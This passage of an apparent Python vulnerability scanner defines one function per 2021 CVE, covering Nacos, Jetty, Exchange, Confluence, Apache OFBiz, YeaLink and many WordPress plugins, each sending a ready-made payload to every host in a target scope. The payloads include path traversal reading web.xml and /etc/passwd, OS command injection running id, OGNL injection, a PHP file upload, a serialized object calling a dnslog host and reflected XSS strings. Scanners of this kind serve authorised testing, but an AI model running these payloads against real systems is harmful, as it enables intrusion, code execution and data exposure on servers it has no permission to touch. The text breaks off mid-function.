  textF = 'XMLHttpRequest.prototype.open'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-29442
def CVE36(progScope):
  myKey = "5706dcf7ecc8042c028bd1047f536adb"
  vulnCat = "Auth Bypass"
  vulnName = "CVE36"
  severity = "P1"
  vulnDsc = "Nacos prior to 1.4.1 Missing Authentication Check"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/nacos/v1/cs/ops/derby?sql=select+st.tablename+from+sys.systables+st']
  redirAllow = False
  statusF = 200
  textF = 'APP_CONFIGDATA_RELATION_'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-29156
def CVE37(progScope):
  myKey = "b89ad673ce2bfb380f660fabd8f8b439"
  vulnCat = "LDAP Injection"
  vulnName = "CVE37"
  severity = "P1"
  vulnDsc = "The vulnerability was found in the password reset feature that OpenAM provides"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/openam/ui/PWResetUserValidation','/OpenAM-11.0.0/ui/PWResetUserValidation','/ui/PWResetUserValidation']
  redirAllow = False
  statusF = 200
  textF = 'jato.pageSession'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-28937
def CVE38(progScope):
  myKey = "4d4df4cc6581fc269195ea46956d06b7"
  vulnCat = "Password Disclosure"
  vulnName = "CVE38"
  severity = "P1"
  vulnDsc = "The password.html page of the Web management interface of the Acexy Wireless-N WiFi"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/password.html']
  redirAllow = False
  statusF = 200
  textF = 'Password Setting'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-28918
def CVE39(progScope):
  myKey = "08fe28ef9fcef2c3a7a4b36ae2c6b1f0"
  vulnCat = "SSRF"
  vulnName = "CVE39"
  severity = "P1"
  vulnDsc = "Netmask NPM Package SSRF"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/?url=http://0177.0.0.1/server-status','/?host=http://0177.0.0.1/server-status','/?file=http://0177.0.0.1/etc/passwd']
  redirAllow = False
  statusF = 200
  textF = 'Apache Server Status'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text or 'Server Version' in z.text or 'root:x:0:0:' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-28854
def CVE40(progScope):
  myKey = "060fee2426bf51a6e8a6e572137d5338"
  vulnCat = "InfoDisclo"
  vulnName = "CVE40"
  severity = "P1"
  vulnDsc = "VICIdial - Multiple sensitive Information disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/agc/vicidial_mysqli_errors.txt']
  redirAllow = False
  statusF = 200
  textF = 'vdc_db_query'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-28169
def CVE41(progScope):
  myKey = "b64629a728279d1bf183a0d89ce2b6ca"
  vulnCat = "InfoDisclo"
  vulnName = "CVE41"
  severity = "P1"
  vulnDsc = "Jetty Utility Servlets Information Disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/static?/%2557EB-INF/web.xml','/concat?/%2557EB-INF/web.xml']
  redirAllow = False
  statusF = 200
  textF = '</web-app>'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-28164
def CVE42(progScope):
  myKey = "3cad643d72350dea36fb4be21d426902"
  vulnCat = "InfoDisclo"
  vulnName = "CVE42"
  severity = "P1"
  vulnDsc = "Jetty Authorization Before Parsing and Canonicalization"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/%2e/WEB-INF/web.xml']
  redirAllow = False
  statusF = 200
  textF = '</web-app>'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-27905
def CVE43(progScope):
  myKey = "3a40beee4c616de207845c11a245e3f8"
  vulnCat = "SSRF"
  vulnName = "CVE43"
  severity = "P3"
  vulnDsc = "Apache Solr <= 8.8.1 SSRF"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/solr/admin/cores?wt=json']
  redirAllow = False
  statusF = 200
  textF = '<str name="status">OK</str>'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-27850
def CVE44(progScope):
  myKey = "11ac2e18cdb34dc75a64f8cd7c326dd8"
  vulnCat = "RCE"
  vulnName = "CVE44"
  severity = "P1"
  vulnDsc = "Apache Tapestry - Arbitrary class download  - RCE"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/assets/app/something/services/AppModule.class/','/assets/app/1337/services/AppModule.class/']
  redirAllow = False
  statusF = 200
  textF = 'webtools'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'configuration' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-27561
def CVE45(progScope):
  myKey = "542b178b66defeda986c81f1680a41b4"
  vulnCat = "RCE"
  vulnName = "CVE45"
  severity = "P1"
  vulnDsc = "YeaLink DM PreAuth RCE"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/premise/front/getPingData?url=http://0.0.0.0:9600/sm/api/v1/firewall/zone/services?zone=;/usr/bin/id;']
  redirAllow = False
  statusF = 200
  textF = 'gid='
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'uid=' in z.text and 'groups=' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-27330
def CVE46(progScope):
  myKey = "a121d3971a6b889c8a3adc7ef9955cb4"
  vulnCat = "RXSS"
  vulnName = "CVE46"
  severity = "P3"
  vulnDsc = "Triconsole 3.75 XSS"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/calendar_form.php/"><script>alert(document.domain)</script>']
  redirAllow = False
  statusF = 200
  textF = '<script>alert(document.domain)</script>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-26855
def CVE47(progScope):
  myKey = "abd97202ee6034d655805c258460ee46"
  vulnCat = "SSRF"
  vulnName = "CVE47"
  severity = "P2"
  vulnDsc = "Exchange Server SSRF Vulnerability"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'Cookie':'X-AnonResource=true; X-AnonResource-Backend=http://0000nlm6c0j53v2s668g61398133715me.interact.sh/ecp/default.flt?~3;'}
  reqMethod = ""
  postData = ""
  urlList = ['/owa/auth/x.js']
  redirAllow = False
  statusF = 200
  textF = 'em51733189316g866s2v35j0c6mln0000'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-26812
def CVE48(progScope):
  myKey = "ce4823a15b9a60512b50611293f88722"
  vulnCat = "RXSS"
  vulnName = "CVE48"
  severity = "P2"
  vulnDsc = "Moodle jitsi plugin XSS"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/mod/jitsi/sessionpriv.php?avatar=https%3A%2F%2Fdomain.com%2Fuser%2Fpix.php%2F498%2Ff1.jpg&nom=test_user%27)%3balert(document.domain)%3b//&ses=test_user&t=1']
  redirAllow = False
  statusF = 200
  textF = 'alert(document.domain);'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-26723
def CVE49(progScope):
  myKey = "44408aeee6da0f3c69bc7b1ab8358071"
  vulnCat = "RXSS"
  vulnName = "CVE49"
  severity = "P3"
  vulnDsc = "Jenzabar v9.20-v9.2.2 XSS"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/ics?tool=search&query=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E']
  redirAllow = False
  statusF = 200
  textF = '><script>alert(document.domain)</script>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-26722
def CVE50(progScope):
  myKey = "7a480981a060bb1397e010385465aaa1"
  vulnCat = "RXSS"
  vulnName = "CVE50"
  severity = "P3"
  vulnDsc = "LinkedIn Oncall 1.4.0 XSS"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all']
  redirAllow = False
  statusF = 200
  textF = '<img src=x onerror=alert(document.domain)>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-26710
def CVE51(progScope):
  myKey = "65f23c2000db0a1632b0cd95f9b02926"
  vulnCat = "RXSS"
  vulnName = "CVE51"
  severity = "P3"
  vulnDsc = "Redwood v4.3.4.5-v4.5.3 XSS"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/r2w/signIn.do?urll=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E']
  redirAllow = False
  statusF = 200
  textF = '><script>alert(document.domain)</script>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-26475
def CVE52(progScope):
  myKey = "70cf55d351fc564e79ae20b6395e8398"
  vulnCat = "RXSS"
  vulnName = "CVE-2021-26475"
  severity = "P3"
  vulnDsc = "EPrints 3.4.2 XSS"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/cgi/cal?year=2021%3C/title%3E%3Cscript%3Ealert(%27tupi%27)%3C/script%3E']
  redirAllow = False
  statusF = 200
  textF = '</title><script>alert(\'tupi\')</script>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-26295
def CVE53(progScope):
  myKey = "0e61fb0853950039b992c8daac3e4abd"
  vulnCat = "RCE"
  vulnName = "CVE53"
  severity = "P1"
  vulnDsc = "Apache OFBiz RMI deserializes Arbitrary Code Execution"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'Content-Type':'application/xml'}
  reqMethod = "POST"
  postData = """<soapenv:Envelope
            xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
            <soapenv:Header/>
            <soapenv:Body>
                <ser>
                    <map-HashMap>
                        <map-Entry>
                            <map-Key>
                                <cus-obj>bcc62005737220116a6176612e7574696c2e486173684d617005070c341c16606403200246200a6c6f6164466163746f724920097468726573686f6c6478703f4020202020200c770820202010202020017372200c6a6176612e6e65742e55524cfb2537361a7fa37203200749200868617368436f6465492004706f72744c2009617574686f726974797420124c6a6176612f6c616e672f537472696e673b4c200466696c6571207e20034c2004686f737471207e20034c200870726f746f636f6c71207e20034c200372656671207e20037870a0a0a0a0a0a0a0a07420107435336c71392e646e736c6f672e636e7420012f71207e2005742004687474707078742018687474703a2f2f7435336c71392e646e736c6f672e636e2f780a</cus-obj>
                            </map-Key>
                            <map-Value>
                                <std-String value="http://t53lq9.dnslog.cn/"></std-String>
                            </map-Value>
                        </map-Entry>
                    </map-HashMap>
                </ser>
            </soapenv:Body>
        </soapenv:Envelope>"""
  urlList = ['/webtools/control/SOAPService']
  redirAllow = False
  statusF = 200
  textF = 'deserializing'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-26086
def CVE54(progScope):
  myKey = "909f8c0b48faf6375bfe850b801222cb"
  vulnCat = "InfoDisclo"
  vulnName = "CVE54"
  severity = "P1"
  vulnDsc = "Jira Limited Local File Read"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/s/tupi/_/;/WEB-INF/web.xml']
  redirAllow = False
  statusF = 200
  textF = '</web-app>'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-26084
def CVE55(progScope):
  myKey = "9c1d2a2c91313e4870430b9a3037929a"
  vulnCat = "RCE"
  vulnName = "CVE55"
  severity = "P1"
  vulnDsc = "Confluence Server OGNL injection - RCE"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'Content-Type':'application/x-www-form-urlencoded'}
  reqMethod = "POST"
  postData = """queryString=aaaa\u0027%2b#{16*8787}%2b\u0027bbb"""
  urlList = ['/pages/createpage-entervariables.action?SpaceKey=x','/confluence/pages/createpage-entervariables.action?SpaceKey=x','/wiki/pages/createpage-entervariables.action?SpaceKey=x','/users/user-dark-features']
  redirAllow = False
  statusF = 200
  textF = 'value="aaaa{140592=null}'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-24499
def CVE56(progScope):
  myKey = "8427a37f3018e840c69d27eec0b048d3"
  vulnCat = "RCE"
  vulnName = "CVE56"
  severity = "P1"
  vulnDsc = "Workreap WordPress theme - unauthenticated RCE"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'Content-Type':'multipart/form-data; boundary=------------------------cd0dc6bdc00b1cf9','X-Requested-With':'XMLHttpRequest'}
  reqMethod = "POST"
  postData = """-----------------------------cd0dc6bdc00b1cf9
        Content-Disposition: form-data; name="action"
        workreap_award_temp_file_uploader
        -----------------------------cd0dc6bdc00b1cf9
        Content-Disposition: form-data; name="award_img"; filename="tupi.php"
        Content-Type: application/x-httpd-php
        <?php echo md5("CVE-2021-24499"); ?>
        -----------------------------cd0dc6bdc00b1cf9--"""
  urlList = ['/wp-admin/admin-ajax.php','/wp-content/uploads/workreap-temp/tupi.php']
  redirAllow = False
  statusF = 200
  textF = '71abe5077dae2754c36d731cc1534d4d'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-24498
def CVE57(progScope):
  myKey = "519964cd717536a2d2598e0207d56caa"
  vulnCat = "RXSS"
  vulnName = "CVE57"
  severity = "P3"
  vulnDsc = "Calendar Event Multi View < 1.4.01 - Unauthenticated Reflected Cross-Site Scripting (XSS)"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'Accept-Encoding':'gzip, deflate',
        'Accept-Language':'en-GB,en-US;q=0.9,en;q=0.8',
        'Connection':'close'}
  reqMethod = ""
  postData = ""
  urlList = ['/?cpmvc_id=1&cpmvc_do_action=mvparse&f=edit&month_index=0&delete=1&palette=0&paletteDefault=F00&calid=1&id=999&start=a%22%3E%3Csvg/%3E%3C%22&end=a%22%3E%3Csvg/onload=alert(1)%3E%3C%22']
  redirAllow = False
  statusF = 200
  textF = '><svg/onload=alert(1)><'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-24495
def CVE58(progScope):
  myKey = "4a5af29a4590c95bb264db693470840d"
  vulnCat = "RXSS"
  vulnName = "CVE58"
  severity = "P3"
  vulnDsc = "Wordpress Plugin Marmoset Viewer XSS"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/plugins/marmoset-viewer/mviewer.php?id=http://</script><svg/onload=alert(%27iput%27)>','/wp-content/plugins/marmoset-viewer/mviewer.php?id=1+http://a.com%27);alert(/iput/);marmoset.embed(%27a']
  redirAllow = False
  statusF = 200
  textF = '</script><svg/onload=alert(\'iput\')>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-24472
def CVE59(progScope):
  myKey = "71bac857015b7c5111c4405ff6812db3"
  vulnCat = "SSRF/RFI"
  vulnName = "CVE59"
  severity = "P2"
  vulnDsc = "Onair2 < 3.9.9.2 & KenthaRadio < 2.0.2 - Unauthenticated RFI and SSRF"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/?qtproxycall=http://0000nlm6c0j53v2s668g61398133715me.interact.sh']
  redirAllow = False
  statusF = 200
  textF = 'em51733189316g866s2v35j0c6mln0000'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-24407
def CVE60(progScope):
  myKey = "1f4b2b0a84ce8ceb5630eb3faed55e5b"
  vulnCat = "RXSS"
  vulnName = "CVE60"
  severity = "P2"
  vulnDsc = "Jannah < 5.4.5 - Reflected Cross-Site Scripting (XSS)"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'Accept':'*/*'
        ,'Content-Type':'application/x-www-form-urlencoded'}
  reqMethod = "POST"
  postData = """action=tie_ajax_search&query[]=</script><script>alert(document.domain)</script>"""
  urlList = ['/wp-admin/admin-ajax.php']
  redirAllow = False
  statusF = 200
  textF = '</script><script>alert(document.domain)</script>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-24406
def CVE61(progScope):
  myKey = "50d739e9750d348db202c29c0a0db15c"
  vulnCat = "Open Redirect"
  vulnName = "CVE61"
  severity = "P3"
  vulnDsc = "wpForo Forum < 1.9.7 - Open Redirect"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/community/?foro=signin&redirect_to=https://example.com/']
  redirAllow = False
  statusF = 301
  textF = 'https://example.com'
  condition = lambda z : True if((z.status_code == statusF or z.status_code == 302 ) and (textF == z.headers['Location'] )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-24389
def CVE62(progScope):
  myKey = "4e5a039a64cca61018a7db70a5bc77e0"
  vulnCat = "RXSS"
  vulnName = "CVE62"
  severity = "P3"
  vulnDsc = "FoodBakery < 2.2 - Reflected Cross-Site Scripting (XSS)"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/listings/?search_title=&location=&foodbakery_locations_position=filter&search_type=autocomplete&foodbakery_radius=10%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E']
  redirAllow = False
  statusF = 200
  textF = '</script><script>alert(document.domain)</script>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-24387
def CVE63(progScope):
  myKey = "ef4b74ad6f458c5c7c982424f473f5c9"
  vulnCat = "RXSS"
  vulnName = "CVE63"
  severity = "P3"
  vulnDsc = "Real Estate 7 WordPress Theme < 3.1.1 - Unauthenticated Reflected XSS"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'Accept-Encoding': 'gzip, deflate'
        ,'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8'
        ,'Connection': 'close'}
  reqMethod = ""
  postData = ""
  urlList = ['/?ct_mobile_keyword&ct_keyword&ct_city&ct_zipcode&search-listings=true&ct_price_from&ct_price_to&ct_beds_plus&ct_baths_plus&ct_sqft_from&ct_sqft_to&ct_lotsize_from&ct_lotsize_to&ct_year_from&ct_year_to&ct_community=%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E&ct_mls&ct_brokerage=0&lat&lng']
  redirAllow = False
  statusF = 200
  textF = '<script>alert(document.domain);</script>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-24364
def CVE64(progScope):
  myKey = "5564850e005034acb4eb3c31a120f1ec"
  vulnCat = "RXSS"
  vulnName = "CVE64"
  severity = "P3"
  vulnDsc = "Jannah < 5.4.4 (XSS)"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-admin/admin-ajax.php?action=tie_get_user_weather&options=%7B%27location%27%3A%27Cairo%27%2C%27units%27%3A%27C%27%2C%27forecast_days%27%3A%275%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ecustom_name%27%3A%27Cairo%27%2C%27animated%27%3A%27true%27%7D']
  redirAllow = False
  statusF = 200
  textF = '</script><script>alert(document.domain)</script>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-24342
def CVE65(progScope):
  myKey = "488e0679ef7df990edf63f6724f45f65"
  vulnCat = "RXSS"
  vulnName = "CVE65"
  severity = "P3"
  vulnDsc = "JNews < 8.0.6 - Reflected Cross-Site Scripting (XSS)"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'Accept': '*/*'
        ,'Content-Type': 'application/x-www-form-urlencoded'}
  reqMethod = "POST"
  postData = """lang=en_US&cat_id=6"></script><script>alert(document.domain)</script>&action=jnews_build_mega_category_2&number=6&tags=70%2C64%2C10%2C67"""
  urlList = ['/?ajax-request=jnews']
  redirAllow = False
  statusF = 200
  textF = '</script><script>alert(document.domain)</script>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-24340
def CVE66(progScope):
  myKey = "b05b5807bc469998f53900a4191692c7"
  vulnCat = "SQLi"
  vulnName = "CVE66"
  severity = "P1"
  vulnDsc = "WordPress Plugin WP Statistics 13.0-.7 - Unauthenticated Time-Based Blind SQL Injection"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/plugins/wp-statistics/readme.txt']
  redirAllow = False
  statusF = 200
  textF = 'WP Statistics'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and '13.1.0' not in z.text and '13.1.1' not in z.text and 'Stable tag: 13.1.' not in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-24320
def CVE67(progScope):
  myKey = "e1d6cf15d4cb64789d78625c4ad2492c"
  vulnCat = "RXSS"
  vulnName = "CVE67"
  severity = "P3"
  vulnDsc = "Bello WordPress Theme < 1.6.0 - Reflected Cross-Site Scripting (XSS)"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/listing/?listing_list_view=standard13%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E']
  redirAllow = False
  statusF = 200
  textF = '</script><script>alert(document.domain)</script>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-24316
def CVE68(progScope):
  myKey = "838561941f377168b466c3e4b9d0df31"
  vulnCat = "RXSS"
  vulnName = "CVE68"
  severity = "P3"
  vulnDsc = "Mediumish WordPress Theme <= 1.0.47 - Unauthenticated Reflected XSS & XFS."
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/?post_type=post&s=%22%3E%3Cscript%3Ealert(/iput/)%3C/script%3E ']
  redirAllow = False
  statusF = 200
  textF = '<script>alert(/iput/)</script>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-24298
def CVE69(progScope):
  myKey = "b73c21afbf6ee7863e90e1fd82fe7baa"
  vulnCat = "RXSS"
  vulnName = "CVE69"
  severity = "P3"
  vulnDsc = "Simple Giveaways < 2.36.2 - Reflected Cross-Site Scripting (XSS)"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/giveaway/mygiveaways/?share=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E']
  redirAllow = False
  statusF = 200
  textF = '</script><script>alert(document.domain)</script>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-24291
def CVE70(progScope):
  myKey = "86f60b4697eb2bb9b18651ed6331f2e4"
  vulnCat = "RXSS"
  vulnName = "CVE70"
  severity = "P3"
  vulnDsc = "Photo Gallery < 1.5.69 - Multiple Reflected Cross-Site Scripting (XSS)"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
